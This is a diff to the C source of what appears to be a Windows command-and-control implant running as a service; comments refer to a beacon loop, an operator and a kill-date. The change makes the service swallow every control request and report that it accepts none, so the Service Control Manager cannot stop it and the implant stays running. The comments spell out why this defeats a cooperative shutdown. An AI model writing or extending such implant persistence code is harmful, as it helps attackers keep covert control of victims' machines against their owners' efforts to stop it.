@@ -810,15 +810,13 @@ static SERVICE_STATUS_HANDLE           g_svcStatusHandle         = NULL;
 static AgentState                      g_svc_state;
 
 static void WINAPI _svc_ctrl_handler(DWORD dwControl) {
-    if (dwControl == SERVICE_CONTROL_STOP ||
-        dwControl == SERVICE_CONTROL_SHUTDOWN) {
-        g_svc_state.running = FALSE;
-        SERVICE_STATUS ss = {0};
-        ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-        ss.dwCurrentState = SERVICE_STOP_PENDING;
-        ss.dwWaitHint = 10000;
-        g_pSetServiceStatus(g_svcStatusHandle, &ss);
-    }
+    /* Intentionally ignore ALL controls including STOP/SHUTDOWN.
+     * We told SCM dwControlsAccepted=0 so it shouldn't send STOP,
+     * but if anything arrives we just swallow it.  The agent keeps
+     * running until the operator sends EXIT or the kill-date fires.
+     * SCM can still TerminateProcess us, but it won't get a
+     * cooperative shutdown that kills the beacon loop. */
+    (void)dwControl;
 }
 
 /* Runs the full agent lifecycle — used by both service and standalone paths */
@@ -862,11 +860,13 @@ static void WINAPI _svc_main(DWORD dwArgc, LPWSTR *lpszArgv) {
         return;
     }
 
-    /* Tell SCM we're running — this prevents SCM from killing us */
+    /* Tell SCM we're running.  dwControlsAccepted = 0 means we don't
+     * accept STOP, SHUTDOWN, or any other control.  SCM won't send
+     * SERVICE_CONTROL_STOP so the agent stays alive indefinitely. */
     SERVICE_STATUS ss = {0};
     ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     ss.dwCurrentState = SERVICE_RUNNING;
-    ss.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    ss.dwControlsAccepted = 0;
     g_pSetServiceStatus(g_svcStatusHandle, &ss);
 
     DBG("[svc] service mode: reported SERVICE_RUNNING to SCM");
